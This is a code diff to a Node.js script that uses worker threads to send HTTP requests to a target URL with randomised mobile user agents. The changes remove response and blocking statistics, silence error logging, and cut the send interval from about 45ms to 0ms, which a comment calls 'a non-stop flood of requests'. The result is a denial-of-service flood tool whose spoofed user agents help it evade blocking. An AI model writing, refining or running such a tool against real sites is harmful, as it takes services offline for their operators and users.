@@ -2,7 +2,7 @@ const http = require('http');
 const { Worker, isMainThread, parentPort } = require('worker_threads');
 const url = require('url');
 
-// Helper function to generate random user agents (as described earlier)
+// Helper function to generate random user agent
 function generateRandomMobileUserAgent() {
     const androidModels = [
         "SM-G930F", "Nexus 5X", "Mi 11X Pro", "ASUS_X00QD", "OPPO A9 2020", "Huawei P30", 
@@ -55,49 +55,31 @@ function sendRequests(targetUrl, durationMs) {
 
     // Variables to track request statistics
     let totalSent = 0;
-    let successCount = 0;
-    let blockedCount = 0;
-
-    // Function to update the console log
-    const updateStats = () => {
-        process.stdout.write(
-            `Total Sent: ${totalSent} | Success: ${successCount} | Blocked: ${blockedCount}\r`
-        );
-    };
 
     // Send requests continuously until the duration is over
     const intervalId = setInterval(() => {
         const req = http.request(requestOptions, (res) => {
             totalSent++; // Increment total requests sent
-
-            // Check if the response status is a success (2xx)
-            if (res.statusCode >= 200 && res.statusCode < 300) {
-                successCount++;
-            } else if (res.statusCode === 403 || res.statusCode === 429) {
-                // Consider 403 and 429 as blocked
-                blockedCount++;
-            }
-
-            // Update stats every 100ms
-            updateStats();
+            // We're ignoring the response, no need to track success or errors
+            res.on('data', () => {}); // Consume response body to keep connection alive
         });
 
         req.on('error', (err) => {
-            totalSent++; // Increment total requests sent
-            blockedCount++; // Consider any error as blocked
-            updateStats();
-            console.error('Request error:', err);
+            totalSent++; // Increment total requests sent even on error
+            // No need to track or log errors, just send requests
         });
 
         req.end();
 
-        // Stop after the duration
+        // Stop after the specified duration
         if (Date.now() - startTime >= durationMs) {
             clearInterval(intervalId);
-            updateStats();
-            console.log(`\nWorker finished. Total requests sent: ${totalSent}`);
+            console.log(`Worker finished. Total requests sent: ${totalSent}`);
         }
-    }, 1000 / 22); // Sending requests every ~45ms to simulate 22 threads
+    }, 0); // 0ms to simulate a non-stop flood of requests
+
+    // To avoid endless loop in case we fail to clearInterval on time
+    setTimeout(() => clearInterval(intervalId), durationMs);
 }
 
 // Main function
